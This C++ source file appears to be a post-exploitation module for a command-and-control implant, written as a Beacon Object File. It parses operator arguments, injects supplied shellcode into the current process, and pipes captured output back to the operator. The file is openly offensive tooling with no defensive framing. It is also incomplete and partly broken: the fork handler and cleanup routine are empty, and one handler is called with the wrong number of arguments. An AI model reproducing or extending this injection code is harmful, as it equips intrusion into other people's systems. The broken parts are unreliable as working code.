#include <kit/kit_process_creation.cc>
#include <kit/kit_spawn_inject.cc>
#include <kit/kit_explicit_inject.cc>

#define POSTEX_METHOD_INLINE 0x20
#define POSTEX_METHOD_FORK   0x30

#define POSTEX_FORK_EXPLICIT 0x20
#define POSTEX_FORK_SPAWN    0x30

struct _POSTEX_OBJ {
    HANDLE pipe_read;
    HANDLE pipe_write;
    HANDLE thread_handle;
    INT8   failure_count;
};
typedef _POSTEX_OBJ POSTEX_OBJ;

#define REMOVE_OBJ( x )
#define APPEND_OBJ( x )

auto postex_inline_handler(
    _In_  PBYTE      shellcode_buff,
    _In_  INT32      shellcode_size,
    _Out_ POSTEX_OBJ posteX_obj
) -> void {
    SECURITY_ATTRIBUTES security_attr = { 
        .nLength              = sizeof(SECURITY_ATTRIBUTES), 
        .lpSecurityDescriptor = nullptr, 
        .bInheritHandle       = TRUE 
    };

    ULONG bytes_aval  = 0;
    ULONG bytes_left  = 0;
    PBYTE output_buff = nullptr;

    HANDLE pipe_read  = nullptr;
    HANDLE pipe_write = nullptr;

    HANDLE backup_out = nullptr;

    NTSTATUS status = STATUS_SUCCESS;

    if ( ! CreatePipe( &pipe_read, &pipe_write, &security_attr, PIPE_BUFFER_DEFAULT_LEN ) ) {
        BeaconPrintfW( CALLBACK_ERROR, L"Failed to create pipe with error: (%d) %s", GetLastError(), fmt_error( GetLastError() ) );
        return;
    }

    backup_out = GetStdHandle( STD_OUTPUT_HANDLE );
    SetStdHandle( STD_OUTPUT_HANDLE, pipe_write );

    if ( ! ExplicitInjection( (INT64)nt_current_process(), shellcode_buff, shellcode_size, nullptr ) ) {
        BeaconPrintfW( CALLBACK_ERROR, L"Injection failed" );
        return;
    }

    CloseHandle( pipe_write );
    pipe_write = nullptr;

    if ( ! PeekNamedPipe( pipe_read, nullptr, 0, nullptr, &bytes_aval, &bytes_left ) ) {
        posteX_obj.failure_count++;

        if ( posteX_obj.failure_count == 3 ) {
            return;
        }
    }

    if ( bytes_aval ) {
        output_buff = (PBYTE)malloc( bytes_aval );

        if ( output_buff ) {
            ULONG bytes_read = 0;

            if ( ReadFile( pipe_read, output_buff, bytes_aval, &bytes_read, nullptr ) ) {
                if ( bytes_read ) {
                    BeaconPkgBytes( output_buff, bytes_read );
                }
            } else {
                
            }
        }
    }
}

auto postex_fork_handler(
    _In_ ULONG fork_category,
    _In_ ULONG explitic_pid,
    _In_ PBYTE shellcode_buff,
    _In_ INT32 shellcode_size
) -> void {

}

extern "C" auto go( char* args, int argc ) -> void {
    datap data_psr = { 0 };

    BeaconDataParse( &data_psr, args, argc );

    ULONG postex_method = BeaconDataInt( &data_psr );
    ULONG fork_category = BeaconDataInt( &data_psr );
    ULONG explicit_pid  = BeaconDataInt( &data_psr );

    INT32 shellcode_size = 0;
    PBYTE shellcode_buff = (PBYTE)BeaconDataExtract( &data_psr, &shellcode_size );

    auto cleanup_postex = [&]( void ) -> void {

    };

    switch ( postex_method ) {
        case POSTEX_METHOD_INLINE: {
            postex_inline_handler( shellcode_buff, shellcode_size ); break;
        }
        case POSTEX_METHOD_FORK: {
            postex_fork_handler( fork_category, explicit_pid, shellcode_buff, shellcode_size ); break;
        }
        default:
            BeaconPrintfW( CALLBACK_ERROR, L"Unknown postex method: %X", postex_method );
    }

}